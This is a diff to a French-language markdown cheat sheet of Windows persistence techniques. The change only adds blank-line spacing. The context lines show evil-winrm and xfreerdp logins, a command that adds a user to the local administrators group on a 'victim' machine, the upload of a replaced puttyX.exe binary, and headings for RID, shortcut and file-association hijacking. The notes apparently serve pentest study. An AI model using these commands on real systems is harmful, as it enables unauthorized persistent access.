@@ -7,6 +7,10 @@ Quelques techniques de persistence sur windows
 evil-winrm -i <IP> -u MyUser -p MyPassword
 xfreerdp /u:MyUser /p:MyPassword /v:<IP> +clipboard
 ```
+
+<br>
+<br>
+
 ## Sur la machine [victime]
 ```
 net localgroup administrators MyUser /add
@@ -52,6 +56,9 @@ Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
 ```
 Y ajouter l'utilisateur
 
+<br>
+<br>
+
 ## RID Hijacking
 Check des utilisateurs avec leur RID
 ```
@@ -90,6 +97,8 @@ On réupload derrière
 ```
 upload puttyX.exe
 ```
+<br>
+<br>
 
 ## Shortcut Files
 
@@ -107,6 +116,7 @@ C:\Windows\System32\<file>.exe
 Penser aussi à changer l'icône !
 <br>
 <br>
+
 ## Hijacking File Associations (exemple avec .txt)
 Ouvrir `regedit.exe`
 <br>
